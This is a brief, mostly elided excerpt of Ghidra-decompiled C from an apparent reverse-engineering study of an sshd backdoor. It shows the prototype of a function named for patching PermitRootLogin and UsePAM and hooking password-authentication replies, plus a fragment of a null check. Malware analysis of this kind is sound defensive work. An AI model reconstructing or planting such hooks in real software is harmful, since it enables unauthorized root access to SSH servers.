// /home/kali/xzre-ghidra/xzregh/107D50_sshd_patch_permitrootlogin_usepam_and_hook_authpassword.c
// Function: sshd_patch_permitrootlogin_usepam_and_hook_authpassword @ 0x107D50
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_patch_permitrootlogin_usepam_and_hook_authpassword(BOOL skip_root_patch, BOOL disable_pam, BOOL replace_monitor_reqtype, monitor_reqtype_t monitor_reqtype, global_context_t * global_ctx)
...
BOOL sshd_patch_permitrootlogin_usepam_and_hook_authpassword
...

{
  ...
  if ((((global_ctx == (global_context_t *)0x0) ||
      ...
      (authpassword_hook = sshd_ctx->mm_answer_authpassword_send_reply_hook, authpassword_hook == (sshd_monitor_func_t)0x0))
